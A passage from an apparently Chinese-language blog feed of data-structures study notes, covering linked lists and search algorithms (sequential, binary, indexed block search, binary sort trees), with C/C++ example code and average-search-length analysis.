class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;</span><br><span class="line">    InitList(L);</span><br><span class="line">    ElemType e;</span><br><span class="line">    e=<span class="number">1</span>;</span><br><span class="line">    ListInsert_L(L, <span class="number">1</span>, e);</span><br><span class="line">    L-&gt;next-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;L-&gt;next-&gt;next&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><p>单链表的最后一个结点的指针指向头指针</p><p>优点是从表中任意结点出发都可以找到其他结点</p><p>循环链表采用头尾指针，因为这样查找第一个结点和最后一个结点都容易</p><h4 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h4><p>存储实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>&#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">prior</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 查找</title>
      <link href="/2023/11/21/"/>
      <url>/2023/11/21/</url>
      
        <content type="html"><![CDATA[<p>本节的哈希散列技术还有待进一步掌握</p><h3 id="查找的前置知识"><a href="#查找的前置知识" class="headerlink" title="查找的前置知识"></a>查找的前置知识</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>1.查找表：同一类型的数据元素或记录构成的集合</p><p>2.静态查找表：仅作查询和检索操作的查找表</p><p>3.动态查找表：在查找时包含插入、删除或修改</p><p>4.主关键字：可以识别的一个记录的数据项(字段)</p><p>5.次关键字：关联若干记录的数据项（字段）</p><p>6.根据给定的某个值，在查找表中确定一个群关键字等于给定值的数据元素(记录)</p><p>7.查找成功：查找表中存在满足条件的记录</p><p>8.查找不成功：查找表中不存在满足条件的记录</p><h4 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> Keytype; <span class="comment">//Keytype为浮点数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Keytype;<span class="comment">//Keytype为整型数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> Keytype;<span class="comment">//Keytype为字符指针数据类型</span></span><br></pre></td></tr></table></figure><p>数据元素定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">Keytype key;<span class="comment">//关键字</span></span><br><span class="line">... <span class="comment">//可以是其他关键字</span></span><br><span class="line">&#125;ElemType;<span class="comment">//ElemType结构体数据类型</span></span><br></pre></td></tr></table></figure><h4 id="查找的分类"><a href="#查找的分类" class="headerlink" title="查找的分类"></a>查找的分类</h4><p>1.基于关键词比较的查找：顺序查找、折半查砸后、分块查找、BST&amp;AVL、B-树和B+树</p><p>2.基于关键字存储位置的查找：散列法</p><p>根据被查找的数据集合存储位置又分为：</p><p>1.内查找：整个查找过程都在内存进行</p><p>2.外查找：查找过程中需要访问外存</p><h3 id="静态查找表"><a href="#静态查找表" class="headerlink" title="静态查找表"></a>静态查找表</h3><h4 id="顺序表的查找"><a href="#顺序表的查找" class="headerlink" title="顺序表的查找"></a>顺序表的查找</h4><h5 id="静态查找表的抽象数据类型"><a href="#静态查找表的抽象数据类型" class="headerlink" title="静态查找表的抽象数据类型"></a>静态查找表的抽象数据类型</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT StaticSearchTable&#123;</span><br><span class="line">数据对象D：D是具有相同特性的数据元素的集合。每个数据元素含有类型相同的关键字，可唯一表示数据元素。</span><br><span class="line">数据关系R：数据元素同属一个集合</span><br><span class="line">基本操作P：</span><br><span class="line"><span class="built_in">Create</span>(&amp;ST,n);<span class="comment">//建立静态查找表</span></span><br><span class="line"><span class="built_in">Destroy</span>(&amp;ST);<span class="comment">//销毁静态查找表</span></span><br><span class="line"><span class="built_in">Search</span>(ST,key)<span class="comment">//按关键字key查找</span></span><br><span class="line"><span class="built_in">Traverse</span>(ST,<span class="built_in">visit</span>());<span class="comment">//遍历查找表</span></span><br><span class="line"><span class="comment">//插入、删除操作，在顺序表中不适合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="顺序查找表的存储结构"><a href="#顺序查找表的存储结构" class="headerlink" title="顺序查找表的存储结构"></a>顺序查找表的存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br></pre></td></tr></table></figure><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search_Seq</span><span class="params">(SSTable ST,KeyType key)</span></span>&#123;</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=key;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=ST.length;ST.elem[i].key!=key;i--);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">    <span class="comment">//若返回非0，则找到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">2</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">19</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">17</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search_Seq</span>(ST, <span class="number">13</span>));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>进行比较的关键字个数的期望值： 即查找成功时的平均查找长度</p><script type="math/tex; mode=display">ASL=\sum_{i=1}^{n}P_iC_i</script><p>其中n为表长</p><p>$P_i$为查找表中第i个记录被查找的概率</p><p>$C_i$为找到记录i时关键字的比较次数</p><p>在等概率查找情况下，$P_i=\frac{1}{n}$</p><p>顺序表的平均(成功)查找长度为：$ASL_{ss}=\frac{1}{n}\sum_{i=1}^n(n-i+1)=\frac{n+1}{2}$</p><p>在不等概率查找的情况下，ASL在$P_n\geqslant P_{n-1}\geqslant …\geqslant P_2 \geqslant P_1$ 时取最小值</p><p>$ASL_{失败}=n+1$</p><h4 id="有序表的查找"><a href="#有序表的查找" class="headerlink" title="有序表的查找"></a>有序表的查找</h4><h5 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h5><p>前提要求：顺序存储且有序</p><h5 id="折半查找的思想"><a href="#折半查找的思想" class="headerlink" title="折半查找的思想"></a>折半查找的思想</h5><p>1.将要查找的关键字与查找表中间的元素的关键字进行比较，若相等，返回当前位置</p><p>2.若查找关键字比当前位置关键字小，向前秭归，否则向后递归</p><h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search_Bin</span><span class="params">(SSTable ST,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> low=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> high=ST.length;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(ST.elem[mid].key==key) <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ST.elem[mid].key&gt;key)&#123;</span><br><span class="line">            high=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> low=mid+<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="comment">//折半查找，有序表；</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">7</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">20</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search_Bin</span>(ST, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>折半查找只适用于静态查找</p><h5 id="算法分析-1"><a href="#算法分析-1" class="headerlink" title="算法分析"></a>算法分析</h5><p>时间复杂度为$O(\log_2n)$</p><p>对于n个元素，二分查找，成功最多关键字比较次数为$\lceil log_2(n+1)\rceil$（向上取整），不成功的关键字比较次数为：$\lceil log_2(n+1)\rceil$</p><h5 id="折半查找的递归实现"><a href="#折半查找的递归实现" class="headerlink" title="折半查找的递归实现"></a>折半查找的递归实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinSearch2</span><span class="params">(SSTable ST,<span class="type">int</span> low,<span class="type">int</span> high,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">if</span>(low&gt;high) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;ST.elem[mid].key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">BinSearch2</span>(ST, low, mid<span class="number">-1</span>, key);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(key&gt;ST.elem[mid].key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">BinSearch2</span>(ST, mid+<span class="number">1</span>, high, key);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">7</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">20</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">BinSearch2</span>(ST, <span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="索引顺序表的查找"><a href="#索引顺序表的查找" class="headerlink" title="索引顺序表的查找"></a>索引顺序表的查找</h4><h5 id="索引顺序表的存储要求"><a href="#索引顺序表的存储要求" class="headerlink" title="索引顺序表的存储要求"></a>索引顺序表的存储要求</h5><p>两张表 一张线性表 一张索引表</p><p>线性表要求：查找表分为n块，当i&gt;j时，第i块中的最小元素的关键字大于第j块中的最大元素的关键字</p><p>索引表要求：1.索引表是顺序存储 2.索引表里存储了各个块的最大值和开始地址</p><h5 id="索引顺序表的查找思想"><a href="#索引顺序表的查找思想" class="headerlink" title="索引顺序表的查找思想"></a>索引顺序表的查找思想</h5><p>1.首先确定所要查找的关键字在哪一块</p><p>2.在所确定的块中用顺序查找查找关键字</p><h5 id="索引表的存储结构"><a href="#索引表的存储结构" class="headerlink" title="索引表的存储结构"></a>索引表的存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> maxblock 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  KeyType key;</span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">&#125;indextype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  indextype index[maxblock];</span><br><span class="line">  <span class="type">int</span> block;</span><br><span class="line">&#125;INtable;</span><br></pre></td></tr></table></figure><h5 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  索引顺序表</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by 徐可钊 on 2023/11/20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxblock 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  KeyType key;</span><br><span class="line">    <span class="type">int</span> addr;</span><br><span class="line">&#125;indextype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  indextype index[maxblock];</span><br><span class="line">  <span class="type">int</span> block;</span><br><span class="line">&#125;INtable;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search</span><span class="params">(SSTable ST,INtable IX,KeyType key )</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,s=<span class="number">0</span>,e;</span><br><span class="line">    <span class="comment">//s记录查找表中的开始位置</span></span><br><span class="line">    <span class="comment">//e记录查找表中的结束位置</span></span><br><span class="line">    <span class="keyword">while</span>((key&gt;IX.index[i].key)&amp;&amp;(i&lt;IX.block))&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;IX.block)&#123;</span><br><span class="line">        s=IX.index[i].addr;</span><br><span class="line">        <span class="keyword">if</span>(i==IX.block<span class="number">-1</span>) e=ST.length;</span><br><span class="line">        <span class="keyword">else</span> e=IX.index[i+<span class="number">1</span>].addr<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(key!=ST.elem[s].key&amp;&amp;s&lt;=e)</span><br><span class="line">    &#123;</span><br><span class="line">        s+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s&lt;=e) <span class="keyword">return</span> s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(KeyType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="number">22</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">20</span>;</span><br><span class="line">    <span class="comment">//==========</span></span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">33</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">42</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">48</span>;</span><br><span class="line">    <span class="comment">//==========</span></span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">49</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">60</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">86</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">53</span>;</span><br><span class="line">    INtable IX;</span><br><span class="line">    IX.block=<span class="number">3</span>;</span><br><span class="line">    IX.index[<span class="number">0</span>].key=<span class="number">22</span>;</span><br><span class="line">    IX.index[<span class="number">0</span>].addr=<span class="number">0</span>;</span><br><span class="line">    IX.index[<span class="number">1</span>].key=<span class="number">48</span>;</span><br><span class="line">    IX.index[<span class="number">1</span>].addr=<span class="number">4</span>;</span><br><span class="line">    IX.index[<span class="number">2</span>].key=<span class="number">86</span>;</span><br><span class="line">    IX.index[<span class="number">2</span>].addr=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">53</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">49</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析-2"><a href="#算法分析-2" class="headerlink" title="算法分析"></a>算法分析</h5><p>如果索引表长度为b，每块平均程度为L 平均查找长度为：$(b+1)/2+(L+1)/2$</p><p>长度为n的线性表，平均分为$\sqrt n$  查找次数最少</p><h3 id="动态查找表"><a href="#动态查找表" class="headerlink" title="动态查找表"></a>动态查找表</h3><h4 id="二叉排序树和平衡二叉树"><a href="#二叉排序树和平衡二叉树" class="headerlink" title="二叉排序树和平衡二叉树"></a>二叉排序树和平衡二叉树</h4><h5 id="二叉排序树的定义"><a href="#二叉排序树的定义" class="headerlink" title="二叉排序树的定义"></a>二叉排序树的定义</h5><p>二叉排序树(Binary Sort Tree)或者是一颗空树；或者是具有下列性质的二叉树：若根结点有左子树，则左子树上所有结点关键字的值均小于根结点的关键字的值；若根结点有右子树，则右子树上所有结点关键字的值均大结点的关键字的值；根结点的左右子树也分别为二叉排序树。</p><h5 id="二叉排序树的结点查找"><a href="#二叉排序树的结点查找" class="headerlink" title="二叉排序树的结点查找"></a>二叉排序树的结点查找</h5><p>例：<img src="/2023/11/21/二叉排序树的例子.png" alt="二叉排序树例子"><br>查找思想：</p><p>1.当二叉排序树不空时，先将给定值和根结点的关键字比较，若相等，则查找成功；否则：</p><p>2.若给定值小于根结点的关键字，则在左子树上继续进行查砸后</p><p>3.若给定值大于根结点的关键字，则在右子树上继续进行查找</p><p>4.直到找到或查到空结点为止。</p><p>存储结构</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法实现</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    BiTree p=T;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span 